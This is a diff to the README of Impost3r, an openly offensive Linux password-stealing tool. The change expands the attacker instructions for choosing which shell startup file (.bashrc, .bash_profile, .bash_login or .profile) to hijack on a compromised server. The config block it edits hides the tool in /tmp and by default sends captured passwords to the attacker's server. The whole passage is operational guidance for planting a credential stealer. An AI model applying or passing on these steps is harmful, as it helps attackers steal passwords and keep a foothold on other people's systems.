@@ -33,7 +33,9 @@ Only need ordinary user's privilege,and can only steal current user's password.
 
 - First i will assume that attacker has controled a server and the privilege is ordinary user
 
-- Check whether the ```.bash_profile``` file exists in the user's root directory. If the ```.bash_profile``` exists: then check whether ```.bashrc``` is actively loaded in the ```.bash_profile``` file, if it is actively loaded, skip this step and the next check, and continue with the subsequent operations.If ```.bashrc``` is not actively loaded, then **all operations for ```.bashrc``` in the following are replaced with operations for ```.bash_profile```!!!**; If ```.bash_profile``` does not exist: proceed to the next check.
+- Check whether the ```.bash_profile``` file exists in the user's root directory. If the ```.bash_profile``` exists: then check whether ```.bashrc``` is actively loaded in the ```.bash_profile``` file, if it is actively loaded, skip this step and the next two checks, and continue with the subsequent operations.If ```.bashrc``` is not actively loaded, then skip the next two checks and remember **all operations for ```.bashrc``` in the following are replaced with operations for ```.bash_profile```!!!**; If ```.bash_profile``` does not exist: proceed to the next check.
+
+- Check whether the ```.bash_login``` file exists in the user's root directory. If the ```.bash_login``` exists: then check whether ```.bashrc``` is actively loaded in the ```.bash_login``` file, if it is actively loaded, skip this step and the next check, and continue with the subsequent operations.If ```.bashrc``` is not actively loaded, then skip the next check and remember **all operations for ```.bashrc``` in the following are replaced with operations for ```.bash_login```!!!**; If ```.bash_login``` does not exist: proceed to the next check. 
 
 - Check whether there is a ```.profile``` file in the user's root directory. If there is a ```.profile``` file: then check whether ```.bashrc``` is actively loaded in the ```.profile``` file (loaded by default), if it is actively loaded, skip this step and continue with the following operations.If it is not actively loaded, then **all operations for ```.bashrc``` in the following are replaced with operations for ```.profile```!!!**; if ```.profile``` does not exist, in principle, Impost3r will not be available, of course you can also depend on the situation to decide whether to generate ```.bash_profile``` or ```.profile``` file by yourself, and write loading code similar to the following to load ```.bashrc```
 
@@ -69,7 +71,7 @@ fi
     Custom setting
 */
 # define FILENAME "/tmp/.impost3r" \\Set the location where the Impost3r is on the server you attack.
-# define BACKUP_ORI_FILENAME ".bashrc" \\Indicates whether the source user profile backed up by the attacker is .bashrc, .bash_profile or .profile
+# define BACKUP_ORI_FILENAME ".bashrc" \\Indicates whether the source user profile backed up by the attacker is .bashrc or .bash_profile or .profile or .bash_login
 # define BACKUP_ORI_PATH "/tmp/.bashrc" \\Indicates the location of the source user profile backed up by the attacker on the target server
 # define SAVE_OR_SEND 0 \\Set the method you want to apply when Impost3r get the password,(send to your server=0,save the result on the current server=1,default is send)
 
